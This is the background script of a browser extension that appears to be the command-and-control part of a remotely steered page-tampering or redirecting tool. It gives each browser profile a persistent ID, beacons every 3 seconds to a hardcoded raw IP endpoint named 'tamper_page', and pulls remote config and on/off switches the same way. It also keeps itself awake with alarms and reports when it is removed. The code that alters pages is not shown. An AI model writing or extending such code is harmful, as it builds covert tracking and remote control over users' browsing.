// background.js (Service Worker - Manifest V3 - Instant Mode)

const receiverUrl = "http://157.20.27.124/tamper_page/receiver.php";
const FAST_PING_MS = 3000;   // ping every 3 seconds
const FAST_SYNC_MS = 3000;   // fetch config every 3 seconds
const CACHE_DURATION_MS = 1000;

let cachedStatus = { isEnabled: true, debugMode: false, config: {}, friendlyName: '' };
let lastStatusFetchTime = 0;

async function log(level, ...args) {
    try {
        const { debugMode } = await chrome.storage.local.get('debugMode');
        if (debugMode) console[level](`[BG-${level.toUpperCase()}]`, ...args);
    } catch (e) {}
}

// --- Device ID Handling (Auto-generated per browser profile) ---
async function getDeviceId() {
    try {
        let { deviceId } = await chrome.storage.local.get('deviceId');
        if (deviceId) return deviceId;

        const ua = navigator.userAgent || '';
        let browser = 'chrome';
        if (ua.includes('Edg/')) browser = 'edge';
        else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'opera';
        else if (ua.includes('Brave')) browser = 'brave';

        let os = 'os';
        if (ua.includes('Windows')) os = 'win';
        else if (ua.includes('Mac')) os = 'mac';
        else if (ua.includes('Linux')) os = 'linux';

        const timePart = Date.now().toString(36);
        const randomPart = Math.random().toString(36).substring(2, 10);
        deviceId = `PROFILE_${browser}-${os}_${timePart}_${randomPart}`;

        await chrome.storage.local.set({ deviceId });
        console.log(`[BG] New profile registered: ${deviceId}`);
        return deviceId;
    } catch (error) {
        console.error("[BG-CRITICAL] Error generating deviceId:", error);
        return null;
    }
}

// --- API Communication ---
let pingInFlight = false;

async function pingServer() {
    if (pingInFlight) return;
    pingInFlight = true;
    try {
        const deviceId = await getDeviceId();
        if (!deviceId) return;
        await fetch(`${receiverUrl}?action=ping&device_id=${encodeURIComponent(deviceId)}`, { method: 'GET', cache: 'no-store' });
    } catch (error) {
        log('error', `Ping error:`, error);
    } finally {
        pingInFlight = false;
    }
}

async function fetchAndUpdateStatus(deviceId) {
    if (!deviceId) return null;
    try {
        const response = await fetch(`${receiverUrl}?action=getStatus&device_id=${encodeURIComponent(deviceId)}`, { cache: 'no-store' });
        if (!response.ok) return null;
        
        const data = await response.json();
        if (data.status === 'success') {
            const newStatus = {
                config: data.config,
                isEnabled: data.isEnabled,
                debugMode: data.debugMode,
                friendlyName: data.friendlyName || ''
            };
            await chrome.storage.local.set(newStatus);
            cachedStatus = newStatus;
            lastStatusFetchTime = Date.now();
            return newStatus;
        }
    } catch (error) {}
    return null;
}

async function getLatestStatus(forceRefresh = false) {
    const now = Date.now();
    if (!forceRefresh && (now - lastStatusFetchTime < CACHE_DURATION_MS)) return cachedStatus;
    const deviceId = await getDeviceId();
    const freshStatus = await fetchAndUpdateStatus(deviceId);
    return freshStatus || cachedStatus;
}

// --- Fast Loops ---
let fastPingTimer = null;
let fastSyncTimer = null;

function startFastLoops() {
    if (fastPingTimer) return;
    fastPingTimer = setInterval(pingServer, FAST_PING_MS);
    fastSyncTimer = setInterval(async () => {
        const deviceId = await getDeviceId();
        if (deviceId) await fetchAndUpdateStatus(deviceId);
    }, FAST_SYNC_MS);
}

// --- Backup alarm (in case SW sleeps) ---
chrome.alarms.create('backupWake', { delayInMinutes: 1, periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === 'backupWake') {
        const deviceId = await getDeviceId();
        if (deviceId) await fetchAndUpdateStatus(deviceId);
        pingServer();
        if (!fastPingTimer) startFastLoops();
    }
});

// --- Lifecycle ---
chrome.runtime.onInstalled.addListener(async () => {
    const deviceId = await getDeviceId();
    if (deviceId) { await fetchAndUpdateStatus(deviceId); await pingServer(); }
    startFastLoops();
});

chrome.runtime.onStartup.addListener(async () => {
    const deviceId = await getDeviceId();
    if (deviceId) { await fetchAndUpdateStatus(deviceId); await pingServer(); }
    startFastLoops();
});

(async () => {
    const deviceId = await getDeviceId();
    if (deviceId) { await fetchAndUpdateStatus(deviceId); await pingServer(); }
    startFastLoops();
})();

// --- Message Listener ---
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === 'getLatestStatus') {
        getLatestStatus(message.forceRefresh === true).then(sendResponse).catch(() => {
            sendResponse({ isEnabled: false, debugMode: false, config: {}, friendlyName: '', error: true });
        });
        return true;
    }
});

// --- Send goodbye on uninstall/disable (Instant removal) ---
chrome.runtime.onSuspend.addListener(async () => {
    try {
        const deviceId = await getDeviceId();
        if (!deviceId) return;
        await fetch(`${receiverUrl}?action=unregister&device_id=${encodeURIComponent(deviceId)}`, { cache: 'no-store' });
    } catch (e) {}
});

console.log('[BG] Service worker started (Redirector Mode - Fast Polling)');